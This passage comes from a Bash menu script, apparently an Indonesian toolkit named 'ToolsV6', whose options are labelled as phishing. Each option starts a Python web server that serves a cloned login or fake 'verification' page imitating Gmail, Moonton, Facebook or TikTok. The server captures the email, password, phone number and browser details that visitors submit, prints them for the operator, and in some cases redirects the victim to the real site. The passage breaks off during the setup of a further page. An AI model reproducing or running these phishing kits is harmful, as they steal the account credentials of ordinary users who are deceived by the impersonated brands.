            margin-top: 22px;
            width: 100%;
            letter-spacing: 0.3px;
            height: 56px;
        }}
        .login-box button[type=\"submit\"]:hover {{
            background-color: #1557b0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }}
        .login-box a {{
            display: block;
            margin-top: 28px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 17px;
            text-align: left;
        }}
        .login-box a:hover {{
            text-decoration: underline;
        }}
        .error-text {{
            color: red;
            margin-top: 8px;
            font-size: 15px;
            text-align: left;
        }}
        .toggle-container {{
            position: relative;
            margin: 10px 0;
        }}
        .toggle-btn {{
            position: absolute;
            top: 50%;
            right: 16px;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
        }}
        .toggle-btn svg {{
            width: 26px;
            height: 26px;
            opacity: 0.6;
        }}
        .toggle-btn svg:hover {{
            opacity: 1;
        }}
    </style>
</head>
<body>
    <form class=\"login-box\" method=\"POST\">
        <img src=\"https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png\" alt=\"Logo\">
        <div class=\"toggle-container\">
            <input type=\"text\" id=\"email\" name=\"email\" placeholder=\"Email atau nomor telepon\" value=\"{email}\" class=\"{email_class}\" required>
        </div>
        <div class=\"toggle-container\">
            <input type=\"password\" id=\"password\" name=\"password\" placeholder=\"Masukkan password\" class=\"{pass_class}\" required>
            <button type=\"button\" class=\"toggle-btn\" onclick=\"toggleInputType('password', this)\">
                <svg fill=\"#5f6368\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\">
                    <path d=\"M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13
                    c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z\"/><circle cx=\"12\" cy=\"12\" r=\"2.5\"/>
                </svg>
            </button>
        </div>
        {error_msg}
        <button type=\"submit\">Berikutnya</button>
        <a href=\"#\">Buat akun</a>
    </form>
    <script>
        function toggleInputType(id, btn) {{
            const input = document.getElementById(id);
            const icon = btn.querySelector(\"svg\");
            if (input.type === \"password\") {{
                input.type = \"text\";
                icon.innerHTML = '<path d=\"M12 6a9.77 9.77 0 0 1 9 6 9.77 9.77 0 0 1-9 6 9.77 9.77 0 0 1-9-6 9.77 9.77 0 0 1 9-6m0-2C6.48 4 1.73 7.61 0 12c1.73 4.39 6.48 8 12 8s10.27-3.61 12-8c-1.73-4.39-6.48-8-12-8zm0 5a3 3 0 0 0 0 6 3 3 0 0 0 0-6z\"/>';
            }} else {{
                input.type = \"password\";
                icon.innerHTML = '<path d=\"M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13 c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z\"/><circle cx=\"12\" cy=\"12\" r=\"2.5\"/>';
            }}
        }}
    </script>
</body>
</html>
'''
login_success = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login Berhasil</title>
    <style>
        body {{
            background-color: #e0ffe0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            padding: 20px;
        }}
        .success-box {{
            background: white;
            padding: 40px 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }}
        .success-box h2 {{
            color: green;
            font-size: 26px;
        }}
        .success-box p {{
            font-size: 18px;
        }}
    </style>
</head>
<body>
    <div class=\"success-box\">
        <h2>Login berhasil!</h2>
        <p>Akses diberikan. Silakan lanjutkan...</p>
    </div>
</body>
</html>
'''
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        page = html_template.format(
            email=\"\",
            email_class=\"\",
            pass_class=\"\",
            error_msg=\"\"
        )
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(page.encode('utf-8'))  
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        params = urllib.parse.parse_qs(post_data.decode('utf-8'))
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]
        print(f\"\n{GREEN}[DATA DITERIMA]{RESET}\")
        print(f\"{YELLOW} • Gmail : {email}{RESET}\")
        print(f\"{YELLOW} • Password : {password}{RESET}\")
        print(\"-\" * 40)
        email_valid = re.match(r\"^[a-zA-Z0-9_.+-]+@gmail\.com$\", email)
        pass_valid = len(password) > 0
        if email_valid and email in akun_valid and akun_valid[email] == password:
            response = login_success
        else:
            print(f\"{RED}[PENOLAKAN LOGIN]{RESET} Gmail atau password tidak sesuai dengan akun Google.\")
            error_msg = '<p class=\"error-text\">Gmail atau password tidak sesuai dengan akun Google</p>'
            response = html_template.format(
                email=email,
                email_class=\"error\",
                pass_class=\"error\",
                error_msg=error_msg
                )
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(response.encode('utf-8'))
if __name__ == \"__main__\":
    try:
        server = HTTPServer(('', PORT), RequestHandler)
        print(f\"{RED}[{GREEN}INFO{RED}]{CYAN} Server berjalan di http://localhost:{PORT}{RESET}\")
        print()
        server.serve_forever()
    except KeyboardInterrupt:
        print()
        print(\"\n[INFO] Server dihentikan oleh pengguna.\")
        server.server_close()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "4" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
███╗   ███╗██╗     
████╗ ████║██║     
██╔████╔██║██║     
██║╚██╔╝██║██║     
██║ ╚═╝ ██║███████╗
╚═╝     ╚═╝╚══════╝" | lolcat
echo ""
echo -e "${p}Development ${g}: ${c}Thxyzz404"
echo ""
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Menyiapkan Server Website."
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" input 
port=${input:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Telah Aktif Di Port : http://localhost:$port "
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import sys
PORT = $port
HTML_CONTENT = '''<!DOCTYPE html>
<html lang=\"id\">
<head>
  <meta charset=\"UTF-8\">
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes\">
  <title>Login dengan Akun Moonton</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background-color: #1e2a38;
      color: white;
      font-family: 'Segoe UI', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      margin: 0;
    }
    .login-container {
      background-color: #2e3d50;
      padding: 32px 28px;
      border-radius: 24px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.7);
    }
    .login-container h3 {
      font-size: 1.8rem;
      font-weight: 600;
      margin-bottom: 24px;
      text-align: center;
      color: #f0f4fa;
    }
    .input-group {
      position: relative;
      margin: 16px 0 6px 0;
    }
    input[type=\"text\"],
    input[type=\"password\"],
    input[type=\"email\"] {
      width: 100%;
      padding: 16px 48px 16px 18px;
      font-size: 1.1rem;
      border: none;
      border-radius: 14px;
      background-color: #1f2c3b;
      color: #eef3f9;
      box-sizing: border-box;
      outline: 2px solid transparent;
    }
    input[type=\"text\"]:focus,
    input[type=\"password\"]:focus,
    input[type=\"email\"]:focus {
      outline: 2px solid #3b8ed3;
      background-color: #1a2634;
    }
    input::placeholder {
      color: #8b9aad;
      font-weight: 400;
      font-size: 1rem;
    }
    .toggle-password {
      position: absolute;
      right: 18px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      user-select: none;
      font-size: 26px;
      color: #a0b8cf;
      padding: 6px;
      border-radius: 30px;
      background: transparent;
    }
    .toggle-password:hover {
      color: #c7dfff;
      background: rgba(255, 255, 255, 0.03);
    }
    .hint-text {
      font-size: 0.9rem;
      color: #b0c8dd;
      margin: 10px 0 16px 0;
      line-height: 1.4;
      padding-left: 4px;
    }
    button {
      width: 100%;
      padding: 16px 12px;
      background: linear-gradient(145deg, #3b8ed3, #2a6fa8);
      border: none;
      color: white;
      font-weight: 700;
      font-size: 1.2rem;
      border-radius: 40px;
      cursor: pointer;
      margin-top: 6px;
      box-shadow: 0 6px 12px rgba(0, 20, 40, 0.5);
    }
    button:hover {
      background: linear-gradient(145deg, #4b9ee3, #3079b8);
      transform: scale(1.01);
    }
    button:active {
      transform: scale(0.98);
    }
    .link-forgot {
      display: block;
      text-align: right;
      color: #87cefa;
      text-decoration: none;
      font-size: 1rem;
      font-weight: 500;
      margin-top: 20px;
      padding-right: 6px;
    }
    .link-forgot:hover {
      color: #b3dfff;
      text-decoration: underline;
    }
    @media (max-width: 480px) {
      body { padding: 12px; }
      .login-container { padding: 28px 18px; border-radius: 20px; }
      .login-container h3 { font-size: 1.6rem; }
      input[type=\"text\"], input[type=\"password\"], input[type=\"email\"] {
        padding: 15px 44px 15px 16px;
        font-size: 1rem;
      }
      .toggle-password { right: 14px; font-size: 24px; }
      .hint-text { font-size: 0.8rem; }
      button { padding: 15px 10px; font-size: 1.1rem; }
    }
    @media (max-width: 380px) {
      .login-container h3 { font-size: 1.3rem; }
      input { padding: 13px 40px 13px 14px; font-size: 0.95rem; }
      .toggle-password { right: 12px; font-size: 22px; }
    }
  </style>
</head>
<body>
  <div class=\"login-container\">
    <h3>Login dengan Akun Moonton</h3>
    <form method=\"POST\" action=\"/login\">
      <input type=\"text\" name=\"email\" placeholder=\"Alamat Email / Akun Moonton / Nomor Telepon\" required>
      <div class=\"input-group\">
        <input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Kata Sandi\" required>
        <span class=\"toggle-password\" id=\"toggleIcon\" onclick=\"togglePasswordVisibility()\">☐</span>
      </div>
      <div class=\"hint-text\">
        Gunakan 6 karakter atau lebih dengan menggabungkan huruf besar dan kecil, serta tidak menggunakan karakter khusus.
      </div>
      <button type=\"submit\">Login</button>
    </form>
    <a href=\"#\" class=\"link-forgot\">Lupa Kata Sandi?</a>
  </div>
  <script>
    function togglePasswordVisibility() {
      const passwordInput = document.getElementById(\"password\");
      const toggleIcon = document.getElementById(\"toggleIcon\");
      if (!passwordInput || !toggleIcon) return;
      const isPassword = passwordInput.type === \"password\";
      passwordInput.type = isPassword ? \"text\" : \"password\";
      toggleIcon.textContent = isPassword ? \"☑\" : \"☐\";
      toggleIcon.style.color = isPassword ? \"#a0b8cf\" : \"#7fc3ff\";
    }
    document.addEventListener(\"DOMContentLoaded\", function() {
      const toggleIcon = document.getElementById(\"toggleIcon\");
      if (toggleIcon) {
        toggleIcon.textContent = \"☐\";
        toggleIcon.style.color = \"#a0b8cf\";
      }
    });
  </script>
</body>
</html>'''
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")   
    def do_POST(self):
        if self.path == \"/login\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Gmail/ID Moonton : \" + email + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Password : \" + password + \"\033[0m\n\")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Login berhasil! Kami Akan Menghubungkan Anda Kembali Jika Semuanya Sudah Di Proses.</h2>\")
        else:
            self.send_error(404)  
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Salin Portnya : http://localhost:\" + str(PORT) + \"\033[0m\")
    print()
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "5" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
echo "
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██████╔╝
╚═╝     ╚═════╝ 
Developer : Thxyzz404 " | lolcat
port="${1:-8080}"
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import sys
PORT_START = $port
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print('\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port ' + str(port) + ' sedang digunakan.')
            print('\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain dari port yang berbeda.')
            port += 1
PORT = find_available_port(PORT_START)
HTML_CONTENT = \"\"\"<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login Verivikasi</title>
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 400px;
            width: 100%;
        }
        .facebook-logo {
            text-align: center;
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .security-box {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .alert-header {
            background: #fef7e0;
            border: 1px solid #ffd983;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .alert-icon {
            color: #f0c000;
            font-size: 20px;
            margin-right: 10px;
        }
        .password-container {
            position: relative;
            width: 100%;
            margin: 8px 0;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #f5f6f7;
        }
        .password-container input {
            margin: 0;
            padding-right: 45px;
        }
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 20px;
            color: #606770;
            user-select: none;
            background: transparent;
            border: none;
            padding: 5px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px 0;
        }
        .help-links {
            text-align: center;
            margin: 15px 0;
        }
        .help-links a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .create-page {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #dadde1;
        }
        .create-btn {
            background: #42b72a;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"facebook-logo\">facebook</div>   
        <div class=\"security-box\">
            <div class=\"alert-header\">
                <strong>Facebook Login Verivikasi</strong>
            </div>     
            <p style=\"margin-bottom: 20px; color: #606770;\">
                Facebook login verifikasi Metta.
            </p>
            <form id=\"facebookForm\">
                <input type=\"text\" id=\"fbEmail\" placeholder=\"Masukkan Email/Nomer\" required>
                <div class=\"password-container\">
                    <input type=\"password\" id=\"fbPassword\" placeholder=\"Masukkan Password\" required>
                    <span class=\"toggle-password\" id=\"togglePassword\">&#9744;</span>
                </div>    
                <button type=\"submit\" class=\"login-btn\">Kompirmasi</button>
            </form>
            <div class=\"help-links\">
                <a href=\"#\">Lupa akun?</a>
                <a href=\"#\">Bantuan Center</a>
            </div>
        </div>
        <div class=\"create-page\">
            <p style=\"color: #1c1e21; margin-bottom: 15px;\">
                <strong>Verivikasi</strong> metta akun business.
            </p>
            <button class=\"create-btn\">Buat Halaman</button>
        </div>
        <div style=\"text-align: center; margin-top: 30px; color: #737373; font-size: 12px;\">
             &nbsp;&middot;&nbsp; Bahasa Indonesia.
            <br><br>
            Meta &copy; 2026
        </div>
    </div>
    <script>
        const pageId = \"facebook_page\"; 
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('fbPassword');
        let isPassword = true;      
        togglePassword.addEventListener('click', function() {
            isPassword = !isPassword;
            togglePassword.innerHTML = isPassword ? '&#9744;' : '&#9746;';
            passwordInput.type = isPassword ? 'password' : 'text';
        });        
        document.getElementById('facebookForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('fbEmail').value;
            const password = document.getElementById('fbPassword').value;   
            fetch('/collect/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service: 'Facebook',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language
                })
            }).then(() => {
                alert('Apakah akun anda ingin ke verivikasi METTA business?');
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 2000);
            });
        });
    </script>
</body>
</html>\"\"\"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")   
    def do_POST(self):
        if self.path == \"/collect/facebook_page\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            email = data.get('email', '')
            password = data.get('password', '')
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Email/Username :\033[32;1m \" + email + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m \" + password + \"\033[0m\\n\")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Verivikasi METTA Akun.</h2>\")
        else:
            self.send_error(404)  
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:\" + str(PORT) + \"\033[0m\")
    print()
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "6" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
echo "
████████╗████████╗
╚══██╔══╝╚══██╔══╝
   ██║      ██║   
   ██║      ██║   
   ██║      ██║   
   ╚═╝      ╚═╝ 
Developer : Thxyzz404 " | lolcat
port="${1:-8080}"
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import sys
PORT_START = $port
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print('\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port ' + str(port) + ' sedang digunakan.')
            print('\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain dari port yang berbeda.')
            port += 1
PORT = find_available_port(PORT_START)
HTML_CONTENT = \"\"\"<!DOCTYPE html>
<html>
<head>
    <title>TikTok Verifikasi Akun</title>
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #000;
            color: white;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(135deg, #000000, #2d1b69);
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        .tiktok-logo {
            text-align: center;
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
        }
        .tiktok-logo span:nth-child(1) { color: #ff0050; }
        .tiktok-logo span:nth-child(2) { color: #00f2ea; }
        .tiktok-logo span:nth-child(3) { color: #ff0050; }
        .tiktok-logo span:nth-child(4) { color: #00f2ea; }
        .tiktok-logo span:nth-child(5) { color: #ff0050; }
        .tiktok-logo span:nth-child(6) { color: #00f2ea; }
        .verification-box {
            background: rgba(18, 18, 18, 0.8);
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
            backdrop-filter: blur(10px);
        }
        .password-container {
            position: relative;
            width: 100%;
            margin: 10px 0;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 8px;
            background: #000;
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        .password-container input {
            margin: 0;
            padding-right: 45px;
        }
        input:focus {
            outline: none;
            border-color: #ff0050;
            box-shadow: 0 0 10px rgba(255, 0, 80, 0.3);
        }
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 20px;
            color: #888;
            user-select: none;
            background: transparent;
            border: none;
            padding: 5px;
            z-index: 10;
        }
        .verify-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
        }
        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 0, 80, 0.4);
        }
        .benefits {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .benefit-item {
            text-align: center;
        }
        .benefit-icon {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #ff0050;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"tiktok-logo\">
            <span>T</span><span>i</span><span>k</span><span>T</span><span>o</span><span>k</span>
        </div>
        <div class=\"verification-box\">
            <h3 style=\"text-align: center; margin-bottom: 20px;\">Verifikasi Kreator</h3>
            <p style=\"text-align: center; color: #ccc; margin-bottom: 20px;\">
                Verifikasi akun Anda untuk membuka fitur khusus dan tingkatkan visibilitas Anda!
            </p>
            <div class=\"benefits\">
                <div class=\"benefit-item\">
                    <div class=\"benefit-icon\">[+]</div>
                    <div>Lencana Terverifikasi</div>
                </div>
                <div class=\"benefit-item\">
                    <div class=\"benefit-icon\">[+]</div>
                    <div>Lebih Banyak Tayangan</div>
                </div>
                <div class=\"benefit-item\">
                    <div class=\"benefit-icon\">[+]</div>
                    <div>Fitur Premium</div>
                </div>
            </div>
        </div>
        <form id=\"tiktokForm\">
            <input type=\"text\" id=\"tiktokUsername\" placeholder=\"Nama Pengguna atau Email\" required>
            <div class=\"password-container\">
                <input type=\"password\" id=\"tiktokPassword\" placeholder=\"Kata Sandi\" required>
                <span class=\"toggle-password\" id=\"togglePassword\">&#9744;</span>
            </div>
            <input type=\"text\" id=\"tiktokPhone\" placeholder=\"Nomor Telepon (opsional)\">    
            <div class=\"loading\" id=\"loading\">
                <div class=\"spinner\"></div>
                Memverifikasi akun Anda...
            </div>     
            <button type=\"submit\" class=\"verify-btn\">VERIFIKASI AKUN KREATOR</button>
        </form>
        <div style=\"text-align: center; margin-top: 20px; font-size: 12px; color: #666;\">
            Dengan memverifikasi, Anda menyetujui syarat layanan TikTok
        </div>
    </div>
    <script>
        const pageId = \"tiktok_page\";
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('tiktokPassword');
        let isPassword = true;
        togglePassword.addEventListener('click', function() {
            isPassword = !isPassword;
            togglePassword.innerHTML = isPassword ? '&#9744;' : '&#9746;';
            passwordInput.type = isPassword ? 'password' : 'text';
        });
        document.getElementById('tiktokForm').addEventListener('submit', function(e) {
            e.preventDefault();   
            const username = document.getElementById('tiktokUsername').value;
            const password = document.getElementById('tiktokPassword').value;
            const phone = document.getElementById('tiktokPhone').value;
            const loading = document.getElementById('loading');
            const submitBtn = this.querySelector('button[type=\"submit\"]');
            loading.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.textContent = 'MENGVERIFIKASI...';     
            fetch('/collect/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service: 'TikTok',
                    username: username,
                    password: password,
                    phone: phone,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                })
            }).then(() => {
                loading.style.display = 'none';
                submitBtn.textContent = 'VERIFIKASI BERHASIL!';
                submitBtn.style.background = 'linear-gradient(45deg, #00b300, #00f2ea)';          
                setTimeout(() => {
                    alert('Akun kreator berhasil diverifikasi! Membuka fitur premium.');
                    setTimeout(() => {
                        window.location.href = 'https://tiktok.com';
                    }, 2000);
                }, 1000);
            }).catch(() => {
                loading.style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.textContent = 'VERIFIKASI AKUN KREATOR';
                alert('Verifikasi gagal. Silakan coba lagi.');
            });
        });
    </script>
</body>
</html>\"\"\"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")  
    def do_POST(self):
        if self.path == \"/collect/tiktok_page\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            username = data.get('username', '')
            password = data.get('password', '')
            phone = data.get('phone', '')
            service = data.get('service', '')    
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Service :\033[32;1m \" + service + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Username/Email :\033[32;1m \" + username + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m \" + password + \"\033[0m\")
            if phone:
                print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Phone :\033[32;1m \" + phone + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User Agent :\033[32;1m \" + data.get('userAgent', '') + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Platform :\033[32;1m \" + data.get('platform', '') + \"\033[0m\")
            print(\"\")  
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Pemeriksaan keamanan selesai! Anda akan segera dialihkan.</h2>\")
        else:
            self.send_error(404)   
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:\" + str(PORT) + \"\033[0m\")
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Menunggu kredensial.\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "7" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
echo "
███████╗███████╗    
██╔════╝██╔════╝    
█████╗  █████╗      
██╔══╝  ██╔══╝      
██║     ██║         
╚═╝     ╚═╝ 
Developer : Thxyzz404 " | lolcat
port="${1:-8080}"
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import sys
from datetime import datetime
PORT_START = $port
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print('\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port ' + str(port) + ' sedang digunakan.')
